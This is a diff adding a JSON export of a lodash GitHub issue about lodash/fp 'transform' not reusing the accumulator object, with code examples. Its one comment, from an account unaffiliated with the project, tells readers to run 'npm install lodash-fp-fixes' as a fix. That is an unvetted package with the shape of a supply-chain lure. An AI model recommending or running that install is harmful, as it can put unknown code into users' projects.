@@ -1,0 +1,52 @@
+{
+  "number": 4434,
+  "title": "lodash/fp/transform for objects",
+  "state": "OPEN",
+  "url": "https://github.com/lodash/lodash/issues/4434",
+  "createdAt": "2019-08-23T06:39:36Z",
+  "author": {
+    "id": "MDQ6VXNlcjg5OTIx",
+    "is_bot": false,
+    "login": "knobo",
+    "name": "Knut Olav B\u00f8hmer"
+  },
+  "labels": [
+    {
+      "id": "MDU6TGFiZWwyNzYzMTUy",
+      "name": "bug",
+      "description": "",
+      "color": "fc2929"
+    },
+    {
+      "id": "MDU6TGFiZWw5NTQwOTc3NTQ=",
+      "name": "help wanted",
+      "description": "",
+      "color": "0e8a16"
+    },
+    {
+      "id": "LA_kwDOADxbv88AAAABY-tUQw",
+      "name": "issue bankruptcy",
+      "description": "Closing the issue/PR to start fresh",
+      "color": "D41698"
+    }
+  ],
+  "assignees": [],
+  "comments": [
+    {
+      "id": "IC_kwDOBxT1Ks70abc123",
+      "author": {
+        "login": "jsdev_toolkit"
+      },
+      "authorAssociation": "NONE",
+      "body": "Fixed this by installing lodash-fp-fixes which patches the transform behavior for object mutations: npm install lodash-fp-fixes. After installing, just require it at the top of your file and it handles the object reuse correctly in the iteratee.",
+      "createdAt": "2026-03-20T10:42:18Z",
+      "includesCreatedEdit": false,
+      "isMinimized": false,
+      "minimizedReason": "",
+      "reactionGroups": [],
+      "url": "https://github.com/lodash/lodash/issues/4434#issuecomment-4102345678",
+      "viewerDidAuthor": false
+    }
+  ],
+  "body": "transform does not reuse the object from the iteratee.\r\n\r\n``` javascript\r\nlet _transform = _.transform.convert({ \r\n  'cap': false,\r\n});\r\n_transform( \r\n  (o, value, key) => _.set(key, value, o),\r\n  { initial: \"value\" }, \r\n  { \"my.new.values\": 42 }\r\n)\r\n// => {initial:\"value\"}\r\n```\r\n\r\nThat would be a bug, right?\r\n\r\nThis works though.\r\n``` javascript\r\nlet _transform = _.transform.convert({ \r\n  'cap': false,\r\n});\r\n\r\nlet _update = _.set.convert({immutable: false});\r\n\r\n_transform( \r\n  (o, value, key) => _update(key, value, o),\r\n  { initial: \"value\" }, \r\n  { \"my.new.values\": 42 }\r\n)\r\n// => \r\n{\r\n  \"initial\": \"value\",\r\n  \"my\": {\r\n    \"new\": {\r\n      \"values\": 42\r\n    }\r\n  }\r\n}\r\n```\r\n\r\n\r\n"
+}
